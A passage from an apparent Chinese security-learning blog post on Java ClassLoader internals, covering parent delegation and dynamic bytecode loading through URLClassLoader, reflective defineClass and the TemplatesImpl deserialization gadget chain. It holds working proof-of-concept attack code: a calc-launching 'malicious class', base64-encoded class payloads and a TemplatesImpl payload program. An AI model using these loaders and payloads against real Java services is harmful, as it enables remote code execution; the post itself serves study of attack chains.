@@ -1,0 +1,727 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ClassLoader | ret2hh</title>
+<link rel="shortcut icon" href="https://ret2hh.github.io//favicon.ico?v=1668483376321">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ret2hh.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="ClassLoader | ret2hh - Atom Feed" href="https://ret2hh.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="学习ClassLoader的产物
+文章结构参考t00ls https://www.t00ls.com/articles-67731.html
+ClassLoader可以用来动态加载字节码
+把加载理解为调用ClassLoader的loadCl..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ret2hh.github.io/">
+  <img class="avatar" src="https://ret2hh.github.io//images/avatar.png?v=1668483376321" alt="">
+  </a>
+  <h1 class="site-title">
+    ret2hh
+  </h1>
+  <p class="site-description">
+    maybe more than学习记录
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              ClassLoader
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-11-15
+              </span>
+              <span>
+                25 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>学习ClassLoader的产物</p>
+<p>文章结构参考t00ls https://www.t00ls.com/articles-67731.html</p>
+<p>ClassLoader可以用来动态加载字节码<br>
+把加载理解为调用ClassLoader的loadClass（或者是findClass和defineClass）</p>
+<h1 id="什么是字节码">什么是字节码</h1>
+<p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。</p>
+<p>众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台的JVM虚拟机中。</p>
+<p>甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文件，都可以在JVM虚拟机中运行：<br>
+<img src="https://ret2hh.github.io//post-images/1668480438186.png" alt="" loading="lazy"></p>
+<p>以下文章中的字节码可以更广义一些：所有能够恢复成一个类并在JVM虚拟机里加载的字节序列（加密过的也算）。</p>
+<h1 id="classloader原理">ClassLoader原理</h1>
+<p>Java的ClassLoader是用来加载字节码文件(.class文件)最基础的方法。ClassLoader 就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的ClassLoader 就是根据类名来加载类，这个类名是类完整路径（类的全限定名），如java.lang.Runtime 。</p>
+<figure data-type="image" tabindex="1"><img src="https://ret2hh.github.io//post-images/1668480503822.png" alt="" loading="lazy"></figure>
+<h2 id="classloader-基本知识">ClassLoader 基本知识</h2>
+<p><strong>在 JVM 中存在如下4种 ClassLoader：BootstrapClassLoader、ExtensionClassLoader、AppClassLoader、UserDefineClassLoader</strong><br>
+● BootstrapClassLoader: 由 C++ 实现, 负责加载 %JAVA_HOME%\lib 目录中的 java 核心类库, 路径也可由 -Xbootclasspath 参数指定</p>
+<p>● ExtensionClassLoader: 由 sun.misc.Launcher$ExtClassLoader 实现, 负责加载 %JAVA_HOME%\lib\ext 目录中的 java 扩展库, 路径也可由 -Djava.ext.dirs 参数指定</p>
+<p>● AppClassLoader: 由 sun.misc.Launcher$AppClassLoader 实现, 负责加载当前 classpath 下的 class 文件, 路径也可由 -Djava.class.path 参数指定</p>
+<p>● UserDefineClassLoader: 为开发者自行编写, 通过继承 java.lang.ClassLoader 并重写相关方法来自定义 ClassLoader</p>
+<p><strong>一般情况下, 如果不指定 ClassLoader, 我们编写的 Java 类在加载时默认会使用 AppClassLoader (可以通过 ClassLoader.getSystemClassLoader() 来获取)</strong></p>
+<h3 id="父子关系">父子关系</h3>
+<p><strong>不同 ClassLoader 会有父子关系 (注意是父子关系并非继承关系), 父子关系的本质是在 Java.lang.ClassLoader 内部定义了指向父加载器的的常量 parent, 可以通过调用 getParent() 方法获取父加载器</strong><br>
+<img src="https://ret2hh.github.io//post-images/1668480756926.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="2"><img src="https://ret2hh.github.io//post-images/1668480767239.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://ret2hh.github.io//post-images/1668480771469.png" alt="" loading="lazy"></figure>
+<p>通过代码直观看一下类加载器的父子关系：</p>
+<pre><code>package main.webapp;
+
+public class ClassLoaderDemo {
+    public static void main(String[] args) {
+        System.out.println(ClassLoader.getSystemClassLoader());
+        System.out.println(ClassLoader.getSystemClassLoader().getParent());
+        System.out.println(ClassLoader.getSystemClassLoader().getParent().getParent());
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://ret2hh.github.io//post-images/1668480832245.png" alt="" loading="lazy"></figure>
+<p>问题-AppClassLoader 的父加载器为 ExtensionClassLoader, 而 ExtensionClassLoader 的父加载器为 null ?<br>
+这是因为ExtensionClassLoader的父加载器 BoostrapClassLoader 是由 C++ 实现的, 无法在 Java 中获取对应的引用, 所以显示 null</p>
+<h3 id="继承关系">继承关系</h3>
+<p>ClassLoader 之间的<strong>继承关系</strong>如下<br>
+<img src="https://ret2hh.github.io//post-images/1668480878395.png" alt="" loading="lazy"><br>
+直接看代码可以看出来</p>
+<figure data-type="image" tabindex="5"><img src="https://ret2hh.github.io//post-images/1668480922169.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://ret2hh.github.io//post-images/1668480927422.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://ret2hh.github.io//post-images/1668480954874.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://ret2hh.github.io//post-images/1668481052594.png" alt="" loading="lazy"></figure>
+<p>所有的 ClassLoader 都继承自 java.lang.ClassLoader 这个抽象类, 而 ExtClassLoader 和 AppClassLoader 继承自 URLClassLoader</p>
+<p><s>URLClassLoader 这个类在后面还会遇到, 之所以这样继承的原因是 URLClassLoader 既可以加载本地的字节码, 也可以加载远程的字节码, 而 ExtClassLoader 和 AppClassLoader 是对加载本地字节码这一功能的更为具体的实现 (个人理解)</s></p>
+<h3 id="classloader的重要方法">ClassLoader的重要方法</h3>
+<p>loadClass，findClass和defineClass<br>
+java.lang.ClassLoader 是所有 ClassLoader 的基石, 在这个抽象类中定义了几个比较重要的方法<br>
+● loadClass(): 基于双亲委派机制查找 Class, 调用父加载器的 loadClass 方法或自身的 findClass 方法<br>
+● findClass(): 根据名称和位置读取字节码, 并调用 defineClass 方法, 具体实现由子类重写<br>
+● defineClass(): 把 byte 数组形式的字节码转换成对应的 Class 对象 (真正加载字节码的地方)，native方法</p>
+<figure data-type="image" tabindex="9"><img src="https://ret2hh.github.io//post-images/1668481153261.png" alt="" loading="lazy"></figure>
+<h2 id="classloader-加载流程-双亲委派机制">ClassLoader 加载流程 (双亲委派机制)</h2>
+<figure data-type="image" tabindex="10"><img src="https://ret2hh.github.io//post-images/1668481355472.png" alt="" loading="lazy"></figure>
+<p>Java 类的加载方式为&quot;动态加载&quot;, 即程序不会一开始就将所有的 class 都加载进 JVM, 而是根据程序运行的需要, 一步一步加载所需的 class</p>
+<p><strong>class基本是会在以下情况加载（由class字节码变成Class对象）</strong><br>
+● 隐式加载: 通过 new 实例化类, 或通过 类名.方法名() 调用其静态方法, 或调用其静态属性<br>
+● 显式加载: 通过反射的形式, 例如 Class.forName() 或者调用 ClassLoader 的 loadClass 方法</p>
+<p><code>其中 Class.forName() 有两个重载方法 public static Class&lt;?&gt; forName(String className); public static Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader); 这里的 initialize 表示是否进行类初始化, 而 loader 用于指定加载该类的 ClassLoader 调用第一个方法时, initialize 默认为 true, 即进行类初始化 (加载 static 类型的属性, 并且执行 static {} 块中的代码), 如果不想初始化类, 可以调用第二个方法并手动指定 initialize 为 false 而通过 ClassLoader.loadClass() 加载的类默认是不会进行类初始化的, 需要注意一下</code></p>
+<p>类加载基于一种叫做&quot;双亲委派&quot;的机制（看了代码也可以说是loadClass依赖于双亲委派）, 那么什么是双亲委派机制?<br>
+<img src="https://ret2hh.github.io//post-images/1668481348704.png" alt="" loading="lazy"></p>
+<p>简单来说, 就是当前 ClassLoader 在加载 class 时, 会将被加载的 class 委托给它的父加载器加载, 以此类推直到最顶层的 BootstrapClassLoader, 如果 BootstrapClassLoader 无法加载（通过findClass）这个 class, 则会抛出异常, 然后被子加载器捕获, 并由子加载器继续尝试加载, 如果仍然无法加载, 就一层一层往下找直到找到最开始的 ClassLoader, 如果这个 ClassLoader 也无法加载对应 class, 最终则会抛出 java.lang.ClassNotFoundException 异常（在自己的findClass那里抛出）</p>
+<p>看一下 java.lang.ClassLoader#loadClass 的源码会更容易理解这个流程<br>
+参考这里：https://juejin.cn/post/7158735073984905223<br>
+1.先在当前ClassLoader检查是否已经加载了目标类（通过findLoadedClass）；<br>
+2.如果当前ClassLoader没有加载目标类，那么先向尝试让父级ClassLoader加载目标类，直至BootstrapClassLoader；<br>
+3.如果最终所有的父级ClassLoader都没有加载目标类，那么当前ClassLoader尝试自己加载目标类（通过findClass）；<br>
+4.所有父级ClassLoader重复操作1～3步骤；<br>
+5.只要其中任意一个ClassLoader成功加载目标类，那么就直接返回；</p>
+<pre><code>    protected Class&lt;?&gt; loadClass(String name, boolean resolve)
+        throws ClassNotFoundException
+    {
+        synchronized (getClassLoadingLock(name)) {
+            // First, check if the class has already been loaded
+            Class&lt;?&gt; c = findLoadedClass(name);
+            if (c == null) {
+                long t0 = System.nanoTime();
+                try {
+                    if (parent != null) {
+                        c = parent.loadClass(name, false);
+                    } else {
+                        c = findBootstrapClassOrNull(name);
+                    }
+                } catch (ClassNotFoundException e) {
+                    // ClassNotFoundException thrown if class not found
+                    // from the non-null parent class loader
+                }
+
+                if (c == null) {
+                    // If still not found, then invoke findClass in order
+                    // to find the class.
+                    long t1 = System.nanoTime();
+                    c = findClass(name);
+
+                    // this is the defining class loader; record the stats
+                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);
+                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);
+                    sun.misc.PerfCounter.getFindClasses().increment();
+                }
+            }
+            if (resolve) {
+                resolveClass(c);
+            }
+            return c;
+        }
+    }
+</code></pre>
+<p>ClassNotFoundException 是由findClass抛出的，下图为java.net.URLClassLoader#findClass</p>
+<figure data-type="image" tabindex="11"><img src="https://ret2hh.github.io//post-images/1668481440254.png" alt="" loading="lazy"></figure>
+<p>可以看到, 其实 loadClass 的主要作用就是双亲委派, 至于如何获取字节码以及如何将字节码转换为 Class 对象, 都是在 findClass 以及 defineClass 中实现的</p>
+<p>另外, JVM 在判断两个 class 是否相同时, 不仅会判断两者的类名是否相同, 而且会判断两个类是否是由同一个 ClassLoader 加载的, 只有这两个条件同时满足, 才能说明这两个 class 相同</p>
+<h2 id="自定义-classloader">自定义 ClassLoader</h2>
+<p>有了上面的知识, 我们就可以自己编写一个 ClassLoader（重写findClass方法，里面调用defineClass即可）<br>
+ClassLoader 能够加载字节码的关键就在于 loadClass findClass defineClass 这三个方法, 因为 loadClass 实现了双亲委派机制, Java 官方不推荐直接重写该方法 ,重写loadClass可能会破坏双亲委派机制(除去一些特殊情况, 比如 tomcat 和 jdbc 就破坏了这种机制), 而 defineClass 是一个 native 方法, 底层由 C++ 实现（导致难以重写？）, 所以我们的重点就是<strong>重写 findClass 方法, 并最终在里面调用 defineClass</strong><br>
+<code>一个 ClassLoader 在实例化时如果没有指定 parent, 那么它的默认 parent 为 AppClassLoader, 可以通过重写对应的带参构造方法来手动指定 parent ClassLoader</code></p>
+<p>下面实现了非 classpath 下加载 class 的 FileClassLoader</p>
+<p>恶意类：</p>
+<pre><code>public class Hello {
+   public Hello(){
+       try {
+           Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+       } catch (Exception e){
+           e.printStackTrace();
+       }
+   }
+}
+
+</code></pre>
+<p>重写findClass的FileClassLoader：</p>
+<pre><code>package org.hh;
+
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+
+public class FileClassLoader extends ClassLoader{
+   public String basePath;
+
+   public FileClassLoader(String basePath){
+       super();
+       this.basePath  = basePath;
+   }
+
+   @Override
+   protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {
+       byte arr[];
+
+       Path path = Paths.get(this.basePath,name+&quot;.class&quot;);
+       try {
+           arr = Files.readAllBytes(path);
+           return defineClass(name,arr,0,arr.length);
+       } catch (IOException e) {
+           throw new RuntimeException(e);
+       }
+
+
+   }
+
+   public static void main(String[] args) throws InstantiationException, IllegalAccessException, ClassNotFoundException {
+       ClassLoader classLoader = new FileClassLoader(&quot;D:\\sectools\\javasec\\evil\\8u65\\src\\main\\java&quot;);
+       //用自写加载器加载
+       Class clazz = classLoader.loadClass(&quot;Hello&quot;);
+       //触发构造方法
+       clazz.newInstance();
+   }
+}
+
+
+</code></pre>
+<h1 id="利用-classloader-动态加载字节码">利用 ClassLoader 动态加载字节码</h1>
+<p>记录4种ClassLoader加载字节码的方式（URLClassLoader、反射调用ClassLoader的defineClass、TemplatesImpl、BCEL ClassLoader）</p>
+<h2 id="urlclassloader">URLClassLoader</h2>
+<p>URLClassLoader 实际上是我们平时默认使用的AppClassLoader 的父类，所以，我们解释URLClassLoader 的工作过程实际上就是在解释默认的Java类加载器的工作流程。<br>
+正常情况下，Java会根据配置项sun.boot.class.path 和java.class.path 中列举到的基础路径（这些路径是经过处理后的java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：<br>
+● URL未以斜杠/ 结尾，则认为是一个JAR文件，使用JarLoader 来寻找类，即为在Jar包中寻找.class文件<br>
+● URL以斜杠/ 结尾，且协议名是file ，则使用FileLoader 来寻找类，即为在本地文件系统中寻找.class文件<br>
+● URL以斜杠/ 结尾，且协议名不是file ，则使用最基础的Loader 来寻找类</p>
+<h3 id="加载远程class">加载远程class</h3>
+<p>url需要以 / 结尾</p>
+<pre><code>package org.hh;
+
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.URLClassLoader;
+
+public class URLClassLoaderDemo {
+    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException {
+        //填上远程url，如果恶意class处于某个包下，需要构造包名对应的路径。
+        URL url = new URL(&quot;http://127.0.0.1:1234/&quot;);
+        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
+        //恶意class的名称不用加.class
+        Class clazz  = urlClassLoader.loadClass(&quot;Hello&quot;);
+        clazz.newInstance();
+    }
+}
+
+
+</code></pre>
+<h3 id="加载远程jar包">加载远程jar包</h3>
+<pre><code>package org.hh;
+
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.URLClassLoader;
+
+public class URLClassLoaderDemo {
+    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException {
+        //填上远程url，如果恶意class处于某个包下，需要构造包名对应的路径。
+        //加载class
+        //URL url = new URL(&quot;http://127.0.0.1:1234/&quot;);
+        //加载jar包
+        URL url = new URL(&quot;http://127.0.0.1:12345/8u65-1.0-SNAPSHOT-all.jar&quot;);
+        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
+        //恶意class的名称不用加.class
+        Class clazz  = urlClassLoader.loadClass(&quot;Hello&quot;);
+        clazz.newInstance();
+    }
+}
+
+</code></pre>
+<p>所以，作为攻击者，如果我们能够控制目标Java URLClassLoader的基础路径为一个http服务器，则可以利用URLClassLoader远程加载的方式执行任意代码了。</p>
+<h2 id="classloaderdefineclass">ClassLoader#defineClass</h2>
+<p>其实，不管是加载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用：<br>
+<img src="https://ret2hh.github.io//post-images/1668481751354.png" alt="" loading="lazy"></p>
+<p>其中：<br>
+● loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行findClass<br>
+● findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给defineClass<br>
+● defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类</p>
+<p>所以可见，真正核心的部分其实是defineClass ，他决定了如何将一段字节流转变成一个Java类，Java默认的ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中。</p>
+<p>上面讲过, defineClass 的作用就是将字节数组转为对应的 Class 对象, 该方法的签名如下</p>
+<pre><code>    protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len)
+        throws ClassFormatError
+    {
+        return defineClass(name, b, off, len, null);
+    }
+
+</code></pre>
+<p>name 为类名 (可设置为 null), b 为字节码数组, off 为数组的偏移值 (从第几位开始为字节码数据), len 为数组的长度<br>
+因为 defineClass 是一个 protected 方法, 所以我们只能通过反射来调用</p>
+<p>首先需要获取 ClassLoader, 以下是常用几种获取 ClassLoader 的方式</p>
+<pre><code>ClassLoader loader = Thread.currentThread().getContextClassLoader();
+ClassLoader loader = ClassLoader.getSystemClassLoader();
+ClassLoader loader = this.getClass().getClassLoader();
+</code></pre>
+<p>使用certutil将class转为base64编码</p>
+<pre><code>certutil -encode Hello.txt hello.txt
+</code></pre>
+<p>或者使用如下的py脚本：</p>
+<pre><code>import os, base64,sys
+a  = sys.argv[1]
+with open(a, &quot;rb&quot;) as f:
+    bs64_str = base64.b64encode(f.read())
+
+print(bs64_str)
+</code></pre>
+<p>调取defineClass：</p>
+<pre><code> package org.hh;
+
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.Base64;
+
+public class defineClassDemo {
+    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException {
+        String exp = &quot;yv66vgAAADQAIQoACAASCgATABQIABUKABMAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHABkHABcBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACQAKBwAbDAAcAB0BAAhjYWxjLmV4ZQwAHgAfAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAIAAKAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAQABAAkACgABAAsAAABgAAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQACAAwAAAAaAAYAAAACAAQABAANAAcAEAAFABEABgAVAAgADQAAABAAAv8AEAABBwAOAAEHAA8EAAEAEAAAAAIAEQ==&quot;;
+        byte[] code = Base64.getDecoder().decode(exp);
+        //获取AppClassLoader
+        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
+        //通过ClassLoader.class获取ClassLoader的Class对象
+        Method defineClassMethod  = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;,new Class[]{String.class, byte[].class, int.class, int.class});
+        defineClassMethod.setAccessible(true);
+        Class clazz = (Class)defineClassMethod.invoke(classLoader,&quot;Hello&quot;,code,0,code.length);
+        clazz.newInstance();
+
+
+
+    }
+}
+</code></pre>
+<p><strong>注意 getDeclaredMethod 只能获取当前类的所有方法, 而 defineClass 其实是在 AppClassLoader 的父类 java.lang.ClassLoader 里面, 所以需要通过 ClassLoader.class 来获取 Class 对象。</strong><br>
+<img src="https://ret2hh.github.io//post-images/1668481875533.png" alt="" loading="lazy"></p>
+<p>在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它。下面两种方法是攻击者常用的ClassLoader攻击链。</p>
+<h2 id="templatesimpl">TemplatesImpl</h2>
+<p>因为 defineClass 的作用域往往都是不开放的, 攻击者一般很难利用到它, 所以接下来我们引入TemplatesImpl 这条非常重要的利用链, 它是各大反序列化链 (cc, rome, fastjson) 利用的基础</p>
+<p>TemplatesImpl 的全类名是 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl, 其内部实现了一个 TransletClassLoader</p>
+<figure data-type="image" tabindex="12"><img src="https://ret2hh.github.io//post-images/1668481923458.png" alt="" loading="lazy"></figure>
+<p>这个类里重写了defineClass 方法，并且这里没有显式地声明其定义域。Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default，即可以在同一个包内被调用。所以也就是说这里的defineClass 由其父类的protected类型变成了一个default类型的方法，可以被类外部调用。</p>
+<p>据此在 TemplatesImpl 内部寻找调用 defineClass 的方法<br>
+<img src="https://ret2hh.github.io//post-images/1668481953193.png" alt="" loading="lazy"></p>
+<p>其中一些以下划线开头的属性的定义如下<br>
+<img src="https://ret2hh.github.io//post-images/1668481974113.png" alt="" loading="lazy"></p>
+<p>defineTransletClasses 先判断 _bytecodes 是否为 null, 然后实例化了 TransletClassLoader<br>
+之后获取 _bytecodes.length 作为 classCount (_bytecodes 是一个二维数组, 它的长度表示一共有几组字节码需要被加载)<br>
+接着遍历 _bytecodes 并且调用 loader.defineClass() 将返回值赋给 _class 数组<br>
+最后会判断该 Class 是否继承自 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet, 如果条件为真, 就将 _transletIndex 赋为 Class 对应的索引<br>
+这里的 defineTransletClasses 还是一个 private 方法, 我们继续寻找调用它的其它方法（点进usage或者使用 find usage）<br>
+<img src="https://ret2hh.github.io//post-images/1668482006964.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="13"><img src="https://ret2hh.github.io//post-images/1668482011255.png" alt="" loading="lazy"></figure>
+<p>由于经过了 defineClass 生成的 Class 对象不会被初始化, 所以我们需要手动调用它的静态方法/字段, 或者其构造函数来让它初始化/实例化<br>
+getTransletClasses 和 getTransletIndex 虽然都调用了 defineTransletClasses , 但是它们在调用之后并没有进行任何操作, 那么最终被加载的类就无法初始化/实例化, 不符合要求<br>
+而 getTransletInstance 在调用了 defineTransletClasses 之后, 先判断 _name 是否为 null, 然后通过 _transletIndex 取得 _class 数组中对应的 Class 对象并调用了其<strong>无参构造方法</strong>来实例化, 刚好符合了我们的要求</p>
+<p>之后继续寻找调用了 getTransletInstance 的方法</p>
+<figure data-type="image" tabindex="14"><img src="https://ret2hh.github.io//post-images/1668482078603.png" alt="" loading="lazy"></figure>
+<p>newTransformer 方法的访问修饰符为 public, 意味着可以从外部调用, 方法内部在实例化 TransformerImpl 的时候调用了 getTransletInstance<br>
+利用链到这里就能触发了, 当然也可以继续向上找<br>
+<img src="https://ret2hh.github.io//post-images/1668482094891.png" alt="" loading="lazy"></p>
+<p>getOutputProperties 的访问修饰符也是 public, 并且调用了 newTransformer 方法, 刚好也符合要求<br>
+最终我们的利用链为</p>
+<pre><code>TemplatesImpl#getOutputProperties()
+TemplatesImpl#newTransformer()
+TemplatesImpl#getTransletInstance()
+TemplatesImpl#defineTransletClasses()
+TransletClassLoader#defineClass()
+</code></pre>
+<p>或者</p>
+<pre><code>TemplatesImpl#newTransformer()
+TemplatesImpl#getTransletInstance()
+TemplatesImpl#defineTransletClasses()
+TransletClassLoader#defineClass()
+</code></pre>
+<p>TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。</p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+
+import java.io.IOException;
+
+public class TemplatesHello extends AbstractTranslet {
+    public TemplatesHello() throws IOException {
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    }
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+
+</code></pre>
+<p>编写 payload</p>
+<pre><code>TemplatesImpl#getOutputProperties() -&gt;TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()-&gt;TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass() 
+
+</code></pre>
+<pre><code>package org.hh;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.Properties;
+
+//import static com.sun.beans.decoder.FieldElementHandler.setFieldValue;
+
+public class TemplatesImplDemo {
+    public static void main(String[] args) throws Exception {
+        String exp = &quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygp\n&quot; +
+                &quot;VgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJh\n&quot; +
+                &quot;bnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNs\n&quot; +
+                &quot;dGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxp\n&quot; +
+                &quot;emVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9h\n&quot; +
+                &quot;cGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFj\n&quot; +
+                &quot;aGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3Jn\n&quot; +
+                &quot;L2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu\n&quot; +
+                &quot;ZGxlcjspVgEAClNvdXJjZUZpbGUBABNUZW1wbGF0ZXNIZWxsby5qYXZhDAAHAAgH\n&quot; +
+                &quot;ABwMAB0AHgEABGNhbGMMAB8AIAEADlRlbXBsYXRlc0hlbGxvAQBAY29tL3N1bi9v\n&quot; +
+                &quot;cmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RU\n&quot; +
+                &quot;cmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFj\n&quot; +
+                &quot;aGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZh\n&quot; +
+                &quot;L2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGlt\n&quot; +
+                &quot;ZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nl\n&quot; +
+                &quot;c3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YA\n&quot; +
+                &quot;BFexAAAAAQAKAAAADgADAAAACgAEAAsADQAMAAsAAAAEAAEADAABAA0ADgACAAkA\n&quot; +
+                &quot;AAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEAALAAAABAABAA8AAQANABAAAgAJ\n&quot; +
+                &quot;AAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABUACwAAAAQAAQAPAAEAEQAAAAIA\n&quot; +
+                &quot;Eg==&quot;;
+        exp = exp.replaceAll(&quot;\n&quot;,&quot;&quot;);
+        //System.out.println(exp);
+        byte[] code = Base64.getDecoder().decode(exp);
+        TemplatesImpl templatesImpl =  new TemplatesImpl();
+        setFieldValue(&quot;_name&quot;, &quot;TemplatesHello&quot;, templatesImpl);
+        setFieldValue(&quot;_bytecodes&quot;, new byte[][]{code}, templatesImpl);
+        setFieldValue(&quot;_outputProperties&quot;, new Properties(), templatesImpl);
+        setFieldValue(&quot;_indentNumber&quot;, 0, templatesImpl);
+        setFieldValue(&quot;_tfactory&quot;, new TransformerFactoryImpl(), templatesImpl);
+        templatesImpl.getOutputProperties();
+    }
+    public static void setFieldValue(String name, Object value, Object obj) throws Exception{
+        Field f = obj.getClass().getDeclaredField(name);
+        f.setAccessible(true);
+        f.set(obj, value);
+    }
+}
+
+</code></pre>
+<p>因为 TemplatesImpl 只有一个无参构造方法为 public, 所以相关属性的设置只能通过反射来实现<br>
+<img src="https://ret2hh.github.io//post-images/1668482174582.png" alt="" loading="lazy"><br>
